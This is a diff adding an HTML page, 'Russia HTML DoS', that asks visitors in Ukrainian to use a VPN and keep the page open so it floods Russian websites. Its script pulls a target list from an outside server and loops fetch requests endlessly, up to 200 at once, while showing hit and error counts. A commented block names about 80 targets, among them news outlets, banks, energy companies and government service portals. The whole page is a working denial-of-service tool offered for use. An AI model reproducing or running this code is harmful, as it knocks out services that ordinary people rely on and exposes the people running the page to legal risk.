@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>Russia HTML DoS</title>
+    <style>
+        body {
+            margin: 10px;
+            padding: 10px;
+            background: linear-gradient(0deg, #fff20080 60%, #344ceb80 60%);
+        }
+
+        .title {
+            text-align: center;
+            margin: auto;
+            width: 400px;
+            color: rgb(161, 16, 16);
+            background: linear-gradient(0deg, #fff20080 50%, #344ceb80 50%);
+
+        }
+
+        ul {
+            margin-left: auto;
+            margin-right: auto;
+            width: 400px;
+        }
+
+        ul li {
+            transition: 3s;
+        }
+
+        .stats {
+            display: table;
+            position: static;
+            margin: auto;
+            /*margin-right: auto;*/
+            /*width: 10%;*/
+        }
+
+        .desc {
+            color: black;
+            margin-left: auto;
+            margin-right: auto;
+            width: 600px;
+        }
+
+        table, tr {
+            border: 1px black solid;
+            border-collapse: collapse;
+        }
+
+        td {
+            border: 1px black solid;
+        }
+    </style>
+</head>
+<body>
+<h1 class="title">DDos Attack to Russia</h1>
+<p class="desc">Офіційні новини в рф - це театр абсурду і ми вважаємо, що це треба зупинити!</p>
+<p class="desc">
+    1. Для найбільної ефективності запускайте VPN, тому що сайти РФ блокують наші IP адреси.
+    Одним із таких є
+    <a href="https://chrome.google.com/webstore/detail/touch-vpn-secure-and-unli/bihmplhobchoageeokmgbdihknkjbknd?hl=ru">TouchVPN</a>
+</p>
+<p class="desc">2. Будь ласка, просто залиште відкритою цю сторінку на своєму комп'ютері щоб вона автоматично
+    навантажувала
+    сайти
+    російської пропаганди.</p>
+<div id="stats" class="stats">
+</div>
+<div id="errors"></div>
+<script>
+    // let targets = {
+    //     'https://ria.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://gazeta.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://kp.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://riafan.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://pikabu.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://kommersant.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://mk.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://yaplakal.com': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://rbc.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://bezformata.com': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://gazprom.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://lukoil.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://magnit.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://nornickel.com': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://surgutneftegas.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://tatneft.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://evraz.com/ru/': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://nlmk.com': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://sibur.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://severstal.com': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://metalloinvest.com': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://nangs.org': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://rmk-group.ru/ru/': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://tmk-group.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://ya.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://polymetalinternational.com/ru/': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://uralkali.com/ru/': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://eurosib.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://omk.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://sberbank.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://vtb.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://gazprombank.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://gosuslugi.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://mos.ru/uslugi': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://kremlin.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://government.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://mil.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://nalog.gov.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://customs.gov.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://pfr.gov.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://rkn.gov.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://lenta.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://ria.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://ria.ru/lenta/': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.rbc.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.rt.com/': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'http://en.kremlin.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://smotrim.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://tass.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://tvzvezda.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://vsoloviev.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.1tv.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.vesti.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://online.sberbank.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://iz.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://ukraina.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.gazprom.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://lukoil.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://magnit.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.nornickel.com': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.surgutneftegas.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.tatneft.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.evraz.com/ru/': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://nlmk.com': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.sibur.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.severstal.com': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.metalloinvest.com': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.tmk-group.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.polymetalinternational.com/ru/': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.uralkali.com/ru/': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.eurosib.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.sberbank.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.vtb.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.gazprombank.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.gosuslugi.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.mos.ru/uslugi/': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'http://kremlin.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'http://government.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    //     'https://www.nalog.gov.ru': {number_of_requests: 0, number_of_errored_responses: 0},
+    // }
+
+    let xhr = new XMLHttpRequest();
+    xhr.open('POST', 'http://skyfire.name/api/api_json_resource');
+    xhr.send();
+    let targets;
+    xhr.onload = async function () {
+        if (xhr.status === 200) {
+            targets = JSON.parse(xhr.response)
+            const statsEl = document.getElementById('stats');
+
+            function printStats() {
+                let text = '<table><tr><td>сайт</td><td>успіх</td><td>помилка(сайт лежить)</td></tr>';
+                Object.keys(targets).forEach(function (e) {
+                    text += `<tr>
+                        <td>${e}</td>
+                        <td>${targets[e].number_of_requests}</td>
+                        <td>${targets[e].number_of_errored_responses}</td>
+                        </tr>`
+                })
+                text += '</table>'
+                statsEl.innerHTML = '<pre>' + text + '</pre>'
+            }
+
+            if (targets) {
+                printStats()
+                setInterval(printStats, 1000);
+
+                const CONCURRENCY_LIMIT = 200
+                let queue = []
+
+                async function fetchWithTimeout(resource, options) {
+                    const controller = new AbortController();
+                    const id = setTimeout(() => controller.abort(), options.timeout);
+                    return fetch(resource, {
+                        signal: controller.signal
+                    }).then((response) => {
+                        clearTimeout(id);
+                        return response;
+                    }).catch((error) => {
+                        clearTimeout(id);
+                        throw error;
+                    });
+                }
+
+                async function flood(target) {
+                    while (true) {
+                        if (queue.length > CONCURRENCY_LIMIT) {
+                            await queue.shift()
+                        }
+                        queue.push(
+                            fetchWithTimeout(target, {timeout: 600})
+                                .catch((error) => {
+                                    if (error.code === 20 /* ABORT */) {
+                                        return;
+                                    }
+                                    targets[target].number_of_errored_responses++;
+                                    targets[target].error_message = error.message
+                                })
+                                .then((response) => {
+                                    if (response && !response.ok) {
+                                        targets[target].number_of_errored_responses++;
+                                        targets[target].error_message = response.statusText
+                                    }
+                                    targets[target].number_of_requests++;
+                                })
+                        )
+                    }
+                }
+
+                //Start
+                Object.keys(targets).map(flood)
+            }
+        }
+    };
+
+</script>
+</body>
+</html>
